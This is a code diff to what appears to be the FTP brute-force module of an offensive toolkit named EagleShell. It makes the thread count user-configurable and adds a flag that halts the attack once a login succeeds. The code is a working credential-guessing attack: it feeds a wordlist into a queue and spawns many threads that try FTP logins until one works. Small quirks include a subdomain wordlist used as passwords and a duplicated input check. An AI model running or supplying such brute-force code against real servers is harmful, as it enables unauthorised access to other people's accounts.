@@ -19,12 +19,13 @@ def bruteftp_main():
     global q
     global password_found
     global password_tried
+    global brute
     password_found = ''
     password_tried = 0
     # initialize the queue
     q = queue.Queue()
-    # number of threads to spawn
-    n_threads = 30
+    # enables brute forcing
+    brute = 'enabled'
 
     # Function that takes some user input
     def configuration():
@@ -32,6 +33,7 @@ def bruteftp_main():
             global host_set
             global user_set
             global port_set
+            global n_threads
             os.system(clear_screen)
             print(logo)
             print('')
@@ -54,6 +56,10 @@ def bruteftp_main():
             print('\tPort Input')
             print('\tExample: 21')
             print('')
+            # number of threads to spawn
+            print('\tThreads Input')
+            print('\tExample: 10')
+            print('')
             print('\tZ): Back')
             print('\tX): Exit')
             print('')
@@ -69,6 +75,12 @@ def bruteftp_main():
                 elif user_set == 'x':
                     exit_shell()
                 port_set = input('\u001b[33mPORT \u001b[37m> ').lower()
+                if port_set == 'z':
+                    redirect_eagleshell_brute_force()
+                elif port_set == 'x':
+                    exit_shell()
+                threads_set = input('\u001b[33mTHREADS \u001b[37m> ').lower()
+                n_threads = threads_set
                 if port_set == 'z':
                     redirect_eagleshell_brute_force()
                 elif port_set == 'x':
@@ -106,6 +118,7 @@ def bruteftp_main():
             global q
             global password_found
             global password_tried
+            global brute
             while True:
                 # get the password from the queue
                 password = q.get()
@@ -122,6 +135,7 @@ def bruteftp_main():
                     # login failed, wrong credentials
                     pass
                 else:
+                    brute = 'disabled'
                     # correct credentials
                     password_found = password
                     # we found the password, let's clear the queue
@@ -138,23 +152,26 @@ def bruteftp_main():
 
     # Function that does the brute force
     def brute_forcing():
-        try:
-            # read the wordlist of passwords
-            passwords = open("/opt/EagleShell/wordlists/subdomains/subdomains-10000.txt").read().split("\n")
+        if brute == 'enabled':
+            try:
+                # read the wordlist of passwords
+                passwords = open("/opt/EagleShell/wordlists/subdomains/subdomains-10000.txt").read().split("\n")
 
-            # put all passwords to the queue
-            for password in passwords:
-                q.put(password)
+                # put all passwords to the queue
+                for password in passwords:
+                    q.put(password)
 
-            # create `n_threads` that runs that function
-            for t in range(n_threads):
-                thread = Thread(target=connect_ftp)
-                # will end when the main thread end
-                thread.daemon = True
-                thread.start()
-            # wait for the queue to be empty
-            q.join()
-        except KeyboardInterrupt:
+                # create `n_threads` that runs that function
+                for t in range(int(n_threads)):
+                    thread = Thread(target=connect_ftp)
+                    # will end when the main thread end
+                    thread.daemon = True
+                    thread.start()
+                # wait for the queue to be empty
+                q.join()
+            except KeyboardInterrupt:
+                pass
+        else:
             pass
 
     def result():
